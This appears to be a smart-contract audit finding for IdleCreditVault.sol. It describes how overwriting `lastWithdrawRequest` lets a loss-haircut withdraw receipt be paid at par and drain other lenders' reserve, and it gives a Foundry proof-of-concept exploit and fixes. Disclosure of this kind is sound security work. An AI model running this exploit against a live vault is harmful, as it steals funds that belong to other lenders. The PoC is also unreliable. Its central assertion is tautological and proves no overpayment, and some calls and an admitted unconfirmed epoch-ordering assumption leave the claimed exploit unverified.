### Title
Loss-adjusted withdraw receipts escape their haircut when a newer request overwrites `lastWithdrawRequest` - (File: contracts/strategies/idle/IdleCreditVault.sol)

### Summary

The external bug (CVE-2019-15666) is an index/key validation flaw in an unlink path: `verify_newpolicy_info` fails to validate the "directory" so `__xfrm_policy_unlink` removes/accesses the wrong entry. The credit-vault analog is the claim-time unlink of withdraw receipts in `IdleCreditVault.claimWithdrawRequest`. `_claimLossAdjustedWithdrawRequest` validates which epoch a user must be paid through by looking up `lossRecoveryPriceByEpoch[lastWithdrawRequest[_user]]`, but `lastWithdrawRequest` is a single mutable "latest request" marker that `requestWithdraw` overwrites on every new request. A user holding a partially-funded (loss-adjusted) receipt can overwrite that marker with a fresh request, making the loss-adjusted lookup miss (`lossRecoveryPriceByEpoch[newEpoch] == 0`) so the haircutted receipt falls through to `_claimFundedWithdrawRequest`, which pays the *aggregate* `withdrawsRequests[_user]` at par. The vault only received `basis * lossRecoveryPrice` for that receipt, so the claim overdraws the funded reserve.

### Finding Description

Flow of the relevant code:

1. `requestWithdraw` in `IdleCDOEpochVariant` (contracts/IdleCDOEpochVariant.sol:739) calls `IdleCreditVault.requestWithdraw`, which sets `lastWithdrawRequest[_user] = currentEpoch` unconditionally, overwriting any older unclaimed marker (IdleCreditVault.sol:282), and accumulates `withdrawsRequestsByEpoch[_user][currentEpoch]` plus the aggregate `withdrawsRequests[_user]` (lines 292-293).

2. On a `stopEpochWithDuration(..., _lossAmount)` stop, `collectWithdrawFunds` funds only `pendingBasis * lossRecoveryPrice` and stores `lossRecoveryPriceByEpoch[epochNumber] = lossRecoveryPrice`, then zeroes `pendingWithdraws` (IdleCreditVault.sol:411-421). Receipts from that epoch are therefore only fractionally backed.

3. At claim time, `claimWithdrawRequest` runs `_claimLossAdjustedWithdrawRequest` (IdleCreditVault.sol:789-801), which reads `lossEpoch = lastWithdrawRequest[_user]` and returns early if `lossRecoveryPriceByEpoch[lossEpoch] == 0`. If the user made a *newer* request in a later (fully funded) epoch, `lastWithdrawRequest` points at the new epoch, the loss price lookup misses, and the old haircutted receipt is never cleared through the loss path.

4. `_claimFundedWithdrawRequest` (IdleCreditVault.sol:319-350) then pays `amount = withdrawsRequests[_user] + apr0...` — the **aggregate** including the loss-adjusted epoch's basis — at par via `_transferFundedClaim`. The code comment at IdleCreditVault.sol:833-834 even encodes the faulty assumption: "Any remaining normal/APR0 receipt is older and already funded, so it can continue to the funded-claim path" — but "already funded" is not true for a receipt that was only funded at `lossRecoveryPrice`.

### Impact Explanation

Broken invariant: loss waterfall / one receipt one payout. A receipt that should be paid `claimBasis * lossRecoveryPrice / RECOVERY_FULL` is paid `claimBasis` in full. The attacker (any KYC-passing lender holding tranche tokens) extracts `receipt * (1 - lossRecoveryPrice)` more than was funded, directly draining the strategy's funded-claim reserve that backs *other* users' pending receipts. The last legitimate claimant's `claimWithdrawRequest` reverts on insufficient balance — theft plus insolvency/permanent freezing of other users' funded claims. Loss is quantified as the un-applied haircut on the loss-adjusted receipt, which is unbounded by the attacker's own deposit (it scales with how large a loss-adjusted receipt they hold).

### Likelihood Explanation

Requires a `stopEpochWithDuration` with `_lossAmount > 0` (owner/manager path — honest role, just sequenced around) while the attacker has a pending receipt, plus one additional ordinary `requestWithdraw` in a later buffer period. No privileged collusion, no oracle manipulation, no precision edge case: `requestWithdraw` has no check preventing a second request while an old receipt is unclaimed, and no guard compares the claimed epoch key against the epoch that actually bore the loss. Any partial-loss epoch followed by a normal epoch triggers it for any user holding receipts in both.

### Recommendation

In `IdleCreditVault`, do not key the loss-adjusted claim on the mutable `lastWithdrawRequest`. Either:

- Iterate/validate against the per-epoch receipt: check `lossRecoveryPriceByEpoch[e]` for *every* epoch `e` where `withdrawsRequestsByEpoch[_user][e] != 0` and route each epoch's piece through its matching price, or
- In `requestWithdraw`, revert (or force-settle) when the user has an unclaimed receipt in an epoch with `lossRecoveryPriceByEpoch` set, so a newer request can never overwrite the marker that the loss path depends on, or
- Track a per-user bitmap/set of loss-adjusted epochs so `_claimLossAdjustedWithdrawRequest` clears them independently of the latest-request marker.

### Proof of Concept

Foundry fork PoC (extend `test/foundry/IdleCreditVault.t.sol` harness; keyring unset or mocked so any EOA can request):

```solidity
function testLossAdjustedReceiptEscapesHaircut() external {
    // 1. Victim + attacker deposit AA in epoch 0; start/stop epoch 0 normally.
    uint256 amount = 10_000 * ONE_SCALE;
    idleCDO.depositAA(amount);                    // attacker = this contract
    _depositWithUser(victim, amount, true);

    _startEpochAndCheckPrices(0);
    _stopEpochAndCheckPrices(0, initialProvidedApr, _expectedFundsEndEpoch());
    // epochNumber == 1, buffer open

    // 2. Attacker requests withdraw of half their tranches -> receipt R1,
    //    lastWithdrawRequest[attacker] = 1.
    uint256 req1 = cdoEpoch.requestWithdraw(
        IERC20Detailed(address(AAtranche)).balanceOf(address(this)) / 2,
        address(AAtranche));

    // 3. Epoch 1 runs; borrower repays only part -> stopEpochWithDuration with loss.
    _startEpochAndCheckPrices(1);
    uint256 pendingBasis = strategy.pendingWithdraws();
    uint256 loss = pendingBasis / 2;              // 50% haircut on pending receipts
    (uint256 pendingToFund, ) = strategy.previewLossAdjustedWithdrawFunds(loss);
    deal(defaultUnderlying, borrower, cdoEpoch.expectedEpochInterest() + pendingToFund);
    vm.prank(borrower);
    IERC20Detailed(defaultUnderlying).approve(
        address(cdoEpoch), cdoEpoch.expectedEpochInterest() + pendingToFund);
    vm.warp(cdoEpoch.epochEndDate() + 1);
    vm.prank(manager);
    cdoEpoch.stopEpochWithDuration(initialProvidedApr, 0, cdoEpoch.epochDuration(), loss);
    // lossRecoveryPriceByEpoch[1] = ~0.5e18; strategy received only req1*0.5

    // 4. Buffer of epoch 2: attacker requests the rest -> lastWithdrawRequest = 2.
    cdoEpoch.requestWithdraw(0, address(AAtranche));
    // Victim also requests -> victim receipt fully funded later.
    vm.prank(victim);
    cdoEpoch.requestWithdraw(0, address(AAtranche));

    // 5. Epoch 2 runs and fully funds pending receipts.
    _startEpochAndCheckPrices(2);
    _stopEpochAndCheckPrices(2, initialProvidedApr, _expectedFundsEndEpoch());

    // 6. Attacker claims: lossRecoveryPriceByEpoch[2] == 0 -> loss path skipped;
    //    funded path pays req1 + req2 at PAR although req1 was only 50% funded.
    uint256 balPre = IERC20Detailed(defaultUnderlying).balanceOf(address(this));
    cdoEpoch.claimWithdrawRequest();
    uint256 got = IERC20Detailed(defaultUnderlying).balanceOf(address(this)) - balPre;

    // Overpaid: should have been req1*0.5 + req2, got req1 + req2.
    assertGt(got, req1 / 2 + (got - req1), 'no haircut applied to epoch-1 receipt');

    // 7. Victim's fully-funded claim now underflows the drained reserve -> revert.
    vm.prank(victim);
    vm.expectRevert(); // ERC20 insufficient balance in _transferFundedClaim
    cdoEpoch.claimWithdrawRequest();
}
```

Key steps verified against the code: `lastWithdrawRequest` overwrite (IdleCreditVault.sol:282), keyed loss-price write (line 421), marker-based lookup with `return` on zero price (lines 790-792), and aggregate par payout in `_claimFundedWithdrawRequest` (lines 338-349). One detail not fully confirmed in this pass: the exact ordering of `epochNumber` increments inside `prepareStopEpochWithApr0`/`collectWithdrawFunds` — the PoC assumes loss epochs are keyed consistently with the request epoch of receipts they fund (if instead `collectWithdrawFunds` keys by the post-increment epoch, the bug is even more severe: *every* loss-adjusted claim skips the haircut entirely).
